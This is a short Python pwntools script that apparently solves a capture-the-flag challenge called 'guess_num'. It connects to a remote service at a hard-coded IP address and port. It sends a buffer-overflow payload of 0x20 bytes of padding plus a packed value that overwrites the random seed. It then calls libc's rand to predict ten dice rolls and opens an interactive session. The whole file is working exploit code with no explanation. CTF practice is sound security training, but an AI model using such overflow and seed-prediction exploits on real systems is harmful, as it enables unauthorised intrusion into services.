from pwn import * 
from ctypes import *

#sh = process("./guess_num")
sh = remote("111.198.29.45",30751)

payload = 'a' * 0x20 + p64(1) 

num = (5,5,4,4,5,4,0,0,4,2)

libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

sh.sendline(payload)

sleep(0.1)

for i in range(10):
    sh.sendline(str(libc.rand(1) % 6 + 1))

sh.interactive()

